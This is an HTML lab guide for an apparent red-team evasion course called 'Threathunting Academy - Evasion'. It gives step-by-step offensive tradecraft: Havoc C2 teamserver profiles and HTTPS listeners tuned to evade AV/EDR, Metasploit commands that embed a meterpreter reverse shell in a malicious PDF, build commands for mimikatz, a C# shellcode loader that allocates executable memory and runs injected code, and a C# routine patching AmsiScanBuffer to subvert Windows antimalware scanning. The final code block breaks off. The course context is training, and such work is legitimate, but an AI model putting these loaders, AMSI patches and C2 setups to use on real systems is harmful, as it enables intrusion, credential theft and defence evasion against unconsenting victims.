<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title></title>
        
        <meta name="robots" content="noindex" />
        

        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        

        
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "light" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div id="sidebar-scrollbox" class="sidebar-scrollbox">
                <ol class="chapter"><li class="expanded "><a href="intro.html"><strong aria-hidden="true">1.</strong> Chapter 1 : Intro </a></li><li><ol class="section"><li class="expanded "><a href="havoc.html"><strong aria-hidden="true">1.1.</strong> Havoc C2</a></li><li class="expanded "><a href="chapter_1.1.html"><strong aria-hidden="true">1.2.</strong> Metasploit Basics</a></li><li class="expanded "><a href="shellcode.html"><strong aria-hidden="true">1.3.</strong> Shellcode</a></li><li><ol class="section"><li class="expanded "><a href="functions.html"><strong aria-hidden="true">1.3.1.</strong> Functions Overview</a></li><li><ol class="section"><li class="expanded "><a href="lab1.1.html"><strong aria-hidden="true">1.3.1.1.</strong> Lab - Payloads</a></li><li class="expanded "><a href="lab_shellcode.html"><strong aria-hidden="true">1.3.1.2.</strong> Lab - Shellcode</a></li><li class="expanded "><a href="lab1.3.html"><strong aria-hidden="true">1.3.1.3.</strong> Lab - Basic Loader</a></li><li class="expanded "><a href="lab1.4.html"><strong aria-hidden="true">1.3.1.4.</strong> Lab - Remote Loader</a></li></ol></li></ol></li><li class="expanded "><a href="defender.html"><strong aria-hidden="true">1.4.</strong> Windows Defender</a></li><li><ol class="section"><li class="expanded "><a href="powershell.html"><strong aria-hidden="true">1.4.1.</strong> Powershell</a></li><li class="expanded "><a href="uac.html"><strong aria-hidden="true">1.4.2.</strong> UAC</a></li><li class="expanded "><a href="amsi.html"><strong aria-hidden="true">1.4.3.</strong> AMSI</a></li><li class="expanded "><a href="hooks.html"><strong aria-hidden="true">1.4.4.</strong> Hooks</a></li><li class="expanded "><a href="etw.html"><strong aria-hidden="true">1.4.5.</strong> ETW</a></li><li class="expanded "><a href="syscalls.html"><strong aria-hidden="true">1.4.6.</strong> SYSCALLS</a></li></ol></li><li class="expanded "><a href="evasion.html"><strong aria-hidden="true">1.5.</strong> Evasion</a></li><li><ol class="section"><li class="expanded "><a href="litterbox.html"><strong aria-hidden="true">1.5.1.</strong> Forensics - Litterbox</a></li></ol></li></ol></li><li class="expanded "><a href="chapter_2.html"><strong aria-hidden="true">2.</strong> Chapter 2 </a></li><li><ol class="section"><li class="expanded "><a href="lsassdump.html"><strong aria-hidden="true">2.1.</strong> LSASS Dumping</a></li><li class="expanded "><a href="chapter_2.1.html"><strong aria-hidden="true">2.2.</strong> Memory</a></li><li class="expanded "><a href="chapter_2.2.html"><strong aria-hidden="true">2.3.</strong> Kerberoasting</a></li><li class="expanded "><a href="chapter_2.3.html"><strong aria-hidden="true">2.4.</strong> Spraying</a></li><li class="expanded "><a href="chapter_2.4.html"><strong aria-hidden="true">2.5.</strong> Relaying</a></li><li class="expanded "><a href="chapter_2.5.html"><strong aria-hidden="true">2.6.</strong> Golden Ticket</a></li><li class="expanded "><a href="chapter_2.6.html"><strong aria-hidden="true">2.7.</strong> DC Sync</a></li><li class="expanded "><a href="chapter_2.7.html"><strong aria-hidden="true">2.8.</strong> Pass the Hash</a></li><li class="expanded "><a href="chapter_2.8.html"><strong aria-hidden="true">2.9.</strong> Evil-WinRM</a></li></ol></li><li class="expanded "><a href="mdbooktricks.html"><strong aria-hidden="true">3.</strong> Chapter Extra </a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar" class="menu-bar">
                    <div id="menu-bar-sticky-container">
                        <div class="left-buttons">
                            <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                                <i class="fa fa-bars"></i>
                            </button>
                            <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                                <i class="fa fa-paint-brush"></i>
                            </button>
                            <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                                <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                            </ul>
                            
                            <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                                <i class="fa fa-search"></i>
                            </button>
                            
                        </div>

                        <h1 class="menu-title"></h1>

                        <div class="right-buttons">
                            <a href="print.html" title="Print this book" aria-label="Print this book">
                                <i id="print-button" class="fa fa-print"></i>
                            </a>
                            
                        </div>
                    </div>
                </div>

                
                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1><a class="header" href="#intro--threathunting-academy---evasion" id="intro--threathunting-academy---evasion">Intro : Threathunting Academy - Evasion</a></h1>
<p><img src="./images/cr_hackers.jpg" alt="image" /></p>
<p>Welcome to the <strong>&quot;Threathunting Academy - Evasion&quot;</strong>  this is the official lab guide that will guide you through the infrastructure. Students will all have their own <strong>Windows 10 client machine</strong>, a shared central <code>Domain Controller</code> and a Kali <code>Red Team server and Forensics machine</code>. All logs are centrally collected on and Ubuntu server running Elasticsearch and Kibana.</p>
<h1><a class="header" href="#havoc-c2" id="havoc-c2">Havoc C2</a></h1>
<p>With a phletora of attack frameworks available (https://howto.thec2matrix.com), the most important requirement is <em>malleability/customizability</em>. Commonly known frameworks such as <code>metasploit</code>, <code>cobalt strike</code>, <code>Empire</code> (Sartkiller GUI), <code>Mythic C2</code> and <code>sliver</code> come to mind. In this training we'll be using a rather new, cobalt strike like framework called <code>Havoc C2</code>.</p>
<p><img src="./images/havoc.jpg" alt="Screenshot" /></p>
<p><a href="https://github.com/HavocFramework/Havoc?tab=readme-ov-file">https://github.com/HavocFramework/Havoc?tab=readme-ov-file</a></p>
<p>Attack frameworks typically all consist of the following elements</p>
<ol>
<li>
<p><em><strong>Teamserver</strong></em>
The central C2 server that receives C2 traffic from implants on its listeners (i.e. <code>LHOST</code> in metasploit), management connections from the client as well as it typically also hosts payloads.</p>
</li>
<li>
<p><em><strong>Client</strong></em>
This is the operater console that connects to the teamserver and allows the adversary to manage listeners, malleable profiles, payloads and implants.</p>
</li>
<li>
<p><em><strong>Implant, beacon, demon, ...</strong></em> 
This is the actual malicious code that communicates back over a C2 channel to the teamserver, very often this is primarily a stager/loader (a tiny program that will download the actual malicious code and typically inject it in to memory of a current or remote process.) - attack frameworks will provide a <code>payload generator</code> that can build different types of payloads (Exe's, dll's, shellcode, etc...).</p>
</li>
</ol>
<p>The most known is probably MSFVenom from the <code>Metasploit Framework</code>.</p>
<p><img src="./images/havoc_msfvenom.jpg" alt="Screenshot" /></p>
<ol start="4">
<li><em><strong>C2 Redirectors</strong></em> 
We won't be using this in the lab, but in real world scenarios these functies as proxies between the victim and the team-server (It's easier to pop up a new proxy, than a completely new teams-server)</li>
</ol>
<p>Havoc C2 is the framework we will be using in this training, however the techniques we'll be using can be utilized in each of beforementioned frameworks.</p>
<blockquote>
<p>On Kali we can simply install Havoc C2 with the following command (this is already done)</p>
</blockquote>
<pre><code class="language-bash">apt install havoc
</code></pre>
<h1><a class="header" href="#creating-a-custom-profile" id="creating-a-custom-profile">Creating a custom profile</a></h1>
<p>Let's have a look at the custom profile we have created for this team server. The profile will have the general settings such as users that can log in to the team server, user agents for HTTP/HTTPs listeners, and how our implants will behave.</p>
<blockquote>
<p><em><strong>OPSEC HINT</strong></em> : Always customize your profiles as default profiles are almost often finger printed by AV/EDR.</p>
</blockquote>
<pre><code class="language-bash">sudo nano /opt/Havoc/profiles/custom.yaotl
</code></pre>
<p>This is the content of the <code>custom.yoatl</code> profile:</p>
<pre><code class="language-yaml">Teamserver {
    Host = &quot;0.0.0.0&quot;
    Port = 40056

    Build {
        Compiler64 = &quot;/usr/bin/x86_64-w64-mingw32-gcc&quot;
        Nasm = &quot;/usr/bin/nasm&quot;
    }
}

Operators {
    user &quot;Threatadmin&quot; {
        Password = &quot;Threathunt25&quot;
    }
}

# demon setting.

Demon {
    Sleep = 2
    Jitter = 20

    TrustXForwardedFor = false

    Injection {
        Spawn64 = &quot;C:\\Windows\\System32\\Werfault.exe&quot;
    }

    Binary {
        ReplaceStrings-x64 = {
            &quot;demon.x64.dll&quot;: &quot;&quot;,
            &quot;This program cannot be run in DOS mode.&quot;: &quot;&quot;,
        }
    }
}
</code></pre>
<h1><a class="header" href="#running-the-teamserver" id="running-the-teamserver">Running the teamserver</a></h1>
<p><img src="./images/havoc_team.jpg" alt="Screenshot" /></p>
<pre><code class="language-bash">havoc server --profile /opt/Havoc/profiles/custom.yoatl -v --debug
</code></pre>
<h1><a class="header" href="#running-the-client" id="running-the-client">Running the client</a></h1>
<p><img src="./images/havoc_newtab.jpg" alt="Screenshot" /></p>
<p>In your terminal open a new tab, then run the following command:</p>
<pre><code class="language-code">havoc client
</code></pre>
<p>We can now log in to our teamserver using the user <code>Threatadmin</code> and the password whcih we defined in the custom Havoc C2 profile.</p>
<p><img src="./images/havoc_login.jpg" alt="Screenshot" /></p>
<p>Let's start by setting up a listener:</p>
<p><a href="https://havocframework.com/docs/profiles">https://havocframework.com/docs/profiles</a></p>
<p>In the Havoc GUI to to <code>view</code> and select listeners.</p>
<p><img src="./images/havoc_viewlistener.jpg" alt="Screenshot" /></p>
<blockquote>
<p><em><strong>OPSEC HINT</strong></em> : Always customize your listeners by using valid user agents, also by using HTTPs we make sure our connections are harder to inspect. This is a nice website to generate user agents strings: <a href="https://useragents.io/parse/my-user-agent">https://useragents.io/parse/my-user-agent</a></p>
</blockquote>
<p>Here's a regular chrome user agent from your windows machine:</p>
<pre><code class="language-yaml">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
</code></pre>
<p>Let's add an HTTPs listener, click on <code>Add</code> and enter the listener configuration. Give the listener a name, select <code>Https</code> and past the user agent in the correct field. Click on <code>Save</code></p>
<blockquote>
<p>Make sure you select the correct IP addres (host) for your machine! You can double check by running ifconfig.</p>
</blockquote>
<p><img src="./images/ifconfig.jpg" alt="Screenshot" /></p>
<p><img src="./images/havoc_addlistener.jpg" alt="Screenshot" /></p>
<p>We can also add this to our Havoc profile, so that all these settings are applied when starting the team server. But before we do that, lets keep our OPSEC in mind, we need HTTPS - and we bettter not use the default SSL certificates, those might be signatured. </p>
<p>Let's create a self-signed SSL certifacate (PEM) and key file - Self signed certificates are of course not ideal - in a real world scenario we'd have them signed by a trusted PKI.</p>
<pre><code class="language-bash">cd /opt/havoc/certs
openssl req -new -newkey rsa:4096 -x509 -sha256 -days 365 -nodes -out public.crt -keyout private.key
</code></pre>
<p>Output:</p>
<p><img src="./images/havoc_certs.jpg" alt="Screenshot" /></p>
<p>Let's copy the custom.yoatl profile to a new HTTPS template where we'll add the certs, user-agent, listener settings and so on</p>
<pre><code class="language-bash">cd /opt/havoc/profiles
sudo cp custom.yoatl https.yoatl
sudo nano /opt/Havoc/profiles/custom.yaotl
</code></pre>
<p>This is the new content of the custom <code>HTTPS.yoatl</code> profile:</p>
<pre><code class="language-yaml">Teamserver {
    Host = &quot;0.0.0.0&quot;
    Port = 40056

    Build {
        Compiler64 = &quot;/usr/bin/x86_64-w64-mingw32-gcc&quot;
        Nasm = &quot;/usr/bin/nasm&quot;
    }
}

Operators {
    user &quot;Threatadmin&quot; {
        Password = &quot;Threathunt25&quot;
    }
}

# HTTPS LISTENER AND CERTS

Listeners {
    Http {
        Name         = &quot;HTTPs Listener&quot;
        Hosts        = [&quot;10.0.0.7&quot;]
        #KillDate     = &quot;2006-01-02 15:04:05&quot; 
        #WorkingHours = &quot;8:00-17:00&quot;
        HostBind     = &quot;0.0.0.0&quot;
        PortBind     = 443
        PortConn     = 443
        HostRotation = &quot;round-robin&quot;
        Secure       = true
        UserAgent    = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36&quot;
        Cert {
                Cert = &quot;/opt/havoc/certs/public.crt&quot;
                Key = &quot;/opt/havoc/certs/private.key&quot;
        }
     }
}
# demon setting.

Demon {
    Sleep = 2
    Jitter = 20

    TrustXForwardedFor = false

    Injection {
        Spawn64 = &quot;C:\\Windows\\System32\\Werfault.exe&quot;
        Spawn32 = &quot;C:\\Windows\\SysWOW64\notepad.exe&quot;
    }

    Binary {
        ReplaceStrings-x64 = {
            &quot;demon.x64.dll&quot;: &quot;&quot;,
            &quot;This program cannot be run in DOS mode.&quot;: &quot;&quot;,
        }
    }
}
</code></pre>
<p>Now close your Havoc Teamserver and client in terminal (control-c) and start the teamserver again with your new profile:</p>
<pre><code class="language-bash">havoc server --profile /opt/havoc/profiles/https.yaotl -v --debug
</code></pre>
<p>Open a second tab in your terminal and run:</p>
<pre><code class="language-bash">havoc client
</code></pre>
<p>On your windows machine when we browse with Chrome to the HTTPs listener (https://10.0.0.7:443), we'll now see our own custom self-signed certificate - one IOC less for AV/EDR to trigger on!</p>
<p><img src="./images/havoc_certswin.jpg" alt="Screenshot" /></p>
<p>We'll create a vanilla demon payload as an executable, make sure all settings are like in the screenshot below (we'll go into the advanced evasion settings later on), save the payload in /opt/havoc/payloads directory:</p>
<p><img src="./images/havoc_payload.jpg" alt="Screenshot" /></p>
<p>On your windows machine use <code>Chrome</code> and got to <a href="http:%5C%5CYourKaliIP:9090%5C">http:\\YourKaliIP:9090\</a> and download the demon to C:\Temp (this is whitelisted in MS Defender)</p>
<p>(configure chrome to allow exe downloads, turn off smartscreen)</p>
<p><img src="./images/havoc_updog.jpg" alt="Screenshot" /></p>
<p><img src="./images/havoc_demon.jpg" alt="Screenshot" /></p>
<p><img src="./images/havoc_session.jpg" alt="Screenshot" /></p>
<p><img src="./images/havoc_session2.jpg" alt="Screenshot" /></p>
<p>We can now interact with this implant by right-clicking the icon and selecting <code>&quot;Interact&quot;</code>.</p>
<p><img src="./images/havoc_interact1.jpg" alt="Screenshot" /></p>
<p><img src="./images/havoc_interact2.jpg" alt="Screenshot" /></p>
<h1><a class="header" href="#havoc-modules" id="havoc-modules">Havoc Modules</a></h1>
<p><em><strong>dotnet</strong></em>
inline-execute
execute</p>
<p><em><strong>Inline - execute (BOF Loader!!!)</strong></em></p>
<blockquote>
<p>OPSEC Hint : When running the shell command, the process hosting your beacon/implant will spawn a child process, run the command and exit the child process. This is quite noisy compared to running everything in memory in the same process. Also command-line logging (eventlogs, sysmon and EDR's will log the commands.)</p>
</blockquote>
<p><em><strong>shell</strong></em></p>
<p><em><strong>shellcode</strong></em> </p>
<pre><code class="language-code">shellcode inject x64 6556 /opt/havoc/payloads/demon.x64.bin
</code></pre>
<blockquote>
<p>Explain sacrificial process - advatages/disadvantages (command line logging, stability, patching, not touching other processes)</p>
</blockquote>
<h1><a class="header" href="#chapter-11---metasploit-basics" id="chapter-11---metasploit-basics">Chapter 1.1 - Metasploit Basics</a></h1>
<p>Log on to your Unbuntu VM with <strong>admin/admin</strong>, open a terminal prompt and start the metasploit console:</p>
<pre><code class="language-code">msfconsole
</code></pre>
<p><img src="./images/01_metasploit.jpg" alt="Screenshot" /></p>
<p>We're going to create a <code>malicious PDF</code> file which contains a meterpreter backdoor that sets up a reverse shell on port 12345. This attack requires an exploit on Adobe PDF, let's have a look which exploits are available within Metasploit to accomplish this.</p>
<pre><code class="language-code">search type:exploit platform:windows adobe pdf
</code></pre>
<p><img src="./images/02_metasploit.jpg" alt="Screenshot" /></p>
<p>As you can see these are all pretty old exploits, but they will do for our proof on concept. There are numerous or PDF readers (such as Foxit, Slim PDF, Nitro and others). New vulnerabilities come out every day and this shows how important keeping your 3rd party applications up to date is.</p>
<p>For now we're going to continue with <strong>adobe_pdf_embedded_exe</strong>.</p>
<pre><code class="language-code">use exploit/windows/fileformat/adobe_pdf_embedded_exe
</code></pre>
<p>We're going to create a simple windows <em>reverse TCP</em> payload that will connect back to our Ubuntu server on <em>Port 12345</em>. This payload will be embedded into the pdf.</p>
<pre><code class="language-code">set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.18.204
set LPORT 12345
exploit
</code></pre>
<p><img src="./images/03_metasploit.jpg" alt="Screenshot" /></p>
<p>Next step is to set up metasploit to listen to reverse TCP connections on port 12345:</p>
<p><img src="./images/04_metasploit.jpg" alt="Screenshot" /></p>
<pre><code class="language-code">back
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.18.204
set LPORT 12345
run
</code></pre>
<p>Open a new terminal window on your Ubuntu and copy your &quot;<strong>evil.pdf</strong>&quot; payload to &quot;/temp&quot;.</p>
<blockquote>
<p><strong><em>NOTE:</em></strong>  Remember to do this as super user, the root directory requires admin privileges. You can do this by typing &quot;<strong>sudo -i</strong>&quot; and entering your password.</p>
</blockquote>
<p><img src="./images/06_copypayload.jpg" alt="Screenshot" /></p>
<pre><code class="language-code">sudo -i
cd /root/.msfconsole/local/
ls -la
cp evil.pdf /temp
</code></pre>
<p>Now let's pivot to our Windows client and download the malicious PDF, we'll be using WinSCP - to transfer our &quot;evil.pdf&quot; from &quot;/temp&quot; to our windows desktop.</p>
<blockquote>
<p><strong><em>NOTE:</em></strong>  Create a new Site in WinSCP, File Protocol = SCP, Port Number =22, Username = admin, Password = admin. In the advanced options you can specify the default starting direcotry, put &quot;/temp&quot; there. Save the connection for later use. Connect to the Ubuntu manchine with WinSCP and download &quot;evil.pdf&quot; to your desktop.</p>
</blockquote>
<p><img src="./images/05_winscp.jpg" alt="Screenshot" /></p>
<p>Once the file is copied to your desktop, right-click the evil.pfd file and select open with &quot;Adobe Reader 9.0&quot;. Remember we are using an old version of adobe that is still vulnerable for this exploit.</p>
<p><img src="./images/07_rightclick.jpg" alt="Screenshot" /></p>
<p><img src="./images/8_adobe_1.jpg" alt="Screenshot" /></p>
<p><img src="./images/9_adobe_2.jpg" alt="Screenshot" /></p>
<p><img src="./images/10_session.jpg" alt="Screenshot" /></p>
<h1><a class="header" href="#shellcode" id="shellcode">Shellcode</a></h1>
<pre><code>What is Shellcode

**What is AMSI/Dotnet (managed/unmanaged code)**
    The .NET Framework provides the Assembly.Load method which allows loading Common Object 
    File Format (COFF) images like such as DLL’s and EXE’s. Assembly.Load can be supplied 
    with a file path to load a DLL from disk, or with a byte array to load directly in memory.

Threatcheck/AMSI Trigger

ClamAV
    dotpeek/hexdump --canonical
    strings -n 5
</code></pre>
<p>Shelcode formats (shellcode formatter etc)</p>
<p>On Windows:</p>
<h2><a class="header" href="#cscexe-csharpdotnet" id="cscexe-csharpdotnet"><em><strong>csc.exe (CSharp/dotnet)</strong></em></a></h2>
<pre><code class="language-code">c:\windows\Microsoft.NET\Framework\v3.5\bin\csc.exe /t:exe /out:loader.exe loader.cs
csc.exe /t:exe /out:$utilName /unsafe $katzPath
</code></pre>
<h2><a class="header" href="#msbuildexe-csharp-c" id="msbuildexe-csharp-c"><em><strong>msbuild.exe (CSharp, C++)</strong></em></a></h2>
<pre><code class="language-code">msbuild buildapp.csproj -t:HelloWorld
msbuild mimidogz.sln /t:Build /p:Configuration=Release /p:Platform=x64
</code></pre>
<pre><code class="language-code">@echo off
set msBuildExe=&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe&quot;
set solutionsFile=&quot;C:\TestProject\mySln.sln&quot;
rem Build the solutions:  
%msBuildExe% /t:Build /p:Configuration=Release /p:Platform=x64 %solutionsFile%
</code></pre>
<h2><a class="header" href="#clexe-c" id="clexe-c"><em><strong>CL.exe (C)</strong></em></a></h2>
<pre><code class="language-code">Developer Prompt Visual Studio
cl.exe hello.c /out:hello.exe /exe

git clone https://github.com/gentilkiwi/mimikatz.git

cl.exe /Zi /I inc\ mimikatz\modules\misc\kuhl_m_misc_citrix.c modules\kull_m_kernel.c 
modules\kull_m_memory.c modules\kull_m_minidump.c modules\kull_m_output.c 
modules\kull_m_process.c modules\kull_m_string.c lib\x64\ntdll.min.lib 
/link kernel32.lib user32.lib advapi32.lib shell32.lib crypt32.lib rpcrt4.lib vcruntime.lib ucrt.lib 
/entry:kuhl_m_misc_citrix_logonpasswords 
/subsystem:console
</code></pre>
<h1><a class="header" href="#chapter-121---functions" id="chapter-121---functions">Chapter 1.2.1 - Functions</a></h1>
<p>learn.micorosoft.com</p>
<p>WIN32 api functions (slides)</p>
<p>Api monitor</p>
<pre><code class="language-csharp">using System;
using System.Diagnostics;
using System.Linq;

class Program
{
    static void Main()
    {

        // Buffer with our shellcode
        byte[] shellCode;
        shellCode = new byte[] 
        { 
            0xfc,0xfc 
        };
        Console.Clear();
        Console.Write(&quot;Shellcode: &quot;);

        foreach (byte b in shellCode)
        {
            Console.Write($&quot;0x{b:X2}, &quot;);  // X2 formats as two-character uppercase hex
        }

        Console.WriteLine();  // To add a newline at the end
        Console.WriteLine();  // To add a newline at the end

        // Find the process with the name &quot;explorer&quot;
        var explorerProcess = Process.GetProcessesByName(&quot;explorer&quot;).FirstOrDefault();

        if (explorerProcess != null)
        {
            Console.WriteLine($&quot;Process ID of explorer.exe: {explorerProcess.Id}&quot;);
        }
        else
        {
            Console.WriteLine(&quot;explorer.exe not found.&quot;);
        }
        Console.WriteLine();  // To add a newline at the end

        // Wait for any key to be pressed
        Console.WriteLine(&quot;Press any key to stop...&quot;);
        Console.ReadKey();

    }
}
</code></pre>
<h1><a class="header" href="#lab-11---payloads" id="lab-11---payloads">Lab 1.1 - Payloads</a></h1>
<h1><a class="header" href="#lab---shellcode" id="lab---shellcode">Lab - Shellcode</a></h1>
<blockquote>
<p>OPSEC HINT : Let's apply some basic best practices when we compile the following code</p>
<ol>
<li>add and icon file to the dotnet app.</li>
<li>add metadata</li>
<li>compile with CSC</li>
</ol>
</blockquote>
<p>When compiling the dotnet code you can specify the .net version</p>
<pre><code class="language-powershell">
</code></pre>
<p>We'll need the .Net Developer Pack 4.8, let's see if it is installed:</p>
<pre><code class="language-cmd">reg query &quot;HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full&quot; /v Version
</code></pre>
<p>CSC.exe is located in &quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe&quot;</p>
<blockquote>
<p>HINT : Remember that AMSI will behave differently with .net assemblies than it would when using powershell scripts. In a powershell script amsi.?dll is automatically loaded into powershell, with dotnet assemblies AMSI will interact with the CLR on demand.</p>
</blockquote>
<p>Let's generate a Havoc shellcode payload (on <code>KALI</code> using the Havoc GUI):</p>
<p>Switch to your windows and under <code>&quot;C:\THEV\Labs\LocalLoader&quot;</code> you'll find a csharp solution file - open that with Visual Studio 2022.</p>
<p>We'll now build our own custom (but very basic) shellcode loader in CSHARP (= dotnet assembly).</p>
<pre><code class="language-csharp">using System;
using System.Runtime.InteropServices;

namespace ShellcodePayload
{
    class Payload
    {
        [DllImport(&quot;kernel32.dll&quot;)]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport(&quot;kernel32.dll&quot;)]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport(&quot;kernel32.dll&quot;)]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main()
        {
            // (1) insert our shellcode
            byte[] shellCode = new byte[] { /* insert shellcode here */ };

            // (2) allocate memory for shellcode
            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellCode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            // (3) inject shellcode into allocated memory
            Marshal.Copy(shellCode, 0, funcAddr, shellCode.Length);

            // (4) execute injected shellcode
            UInt32 threadId = 0;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
</code></pre>
<hr />
<p>To monitor AMSI (Antimalware Scan Interface) calls and see what is being scanned, you would need to hook into the AMSI functions. This is a more advanced technique and typically involves using a debugger or writing a custom DLL to intercept AMSI calls. Below is an example of how you might achieve this using PowerShell and C# to create a custom DLL that hooks into AMSI functions.</p>
<p>First, create a C# DLL to hook AMSI functions:</p>
<pre><code class="language-csharp">using System;
using System.Runtime.InteropServices;

public class AmsiHook
{
    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    private static IntPtr amsiScanBufferPtr;
    private static AmsiScanBufferDelegate originalAmsiScanBuffer;

    private delegate int AmsiScanBufferDelegate(IntPtr amsiContext, IntPtr buffer, uint length, string contentName, IntPtr amsiSession, out int result);

    public static void HookAmsi()
    {
        IntPtr amsiDll = LoadLibrary(&quot;amsi.dll&quot;);
        if (amsiDll == IntPtr.Zero)
        {
            throw new Exception(&quot;Failed to load amsi.dll&quot;);
        }

        amsiScanBufferPtr = GetProcAddress(amsiDll, &quot;AmsiScanBuffer&quot;);
        if (amsiScanBufferPtr == IntPtr.Zero)
        {
            throw new Exception(&quot;Failed to get AmsiScanBuffer address&quot;);
        }

        uint oldProtect;
        VirtualProtect(amsiScanBufferPtr, (UIntPtr)IntPtr.Size, 0x40, out oldProtect);

        originalAmsiScanBuffer = (AmsiScanBufferDelegate)Marshal.GetDelegateForFunctionPointer(amsiScanBufferPtr, typeof(AmsiScanBufferDelegate));
        Marshal.WriteIntPtr(amsiScanBufferPtr, Marshal.GetFunctionPointerForDelegate(new AmsiScanBufferDelegate(HookedAmsiScanBuffer)));

        VirtualProtect(amsiScanBufferPtr, (UIntPtr)IntPtr.Size, oldProtect, out oldProtect);
    }

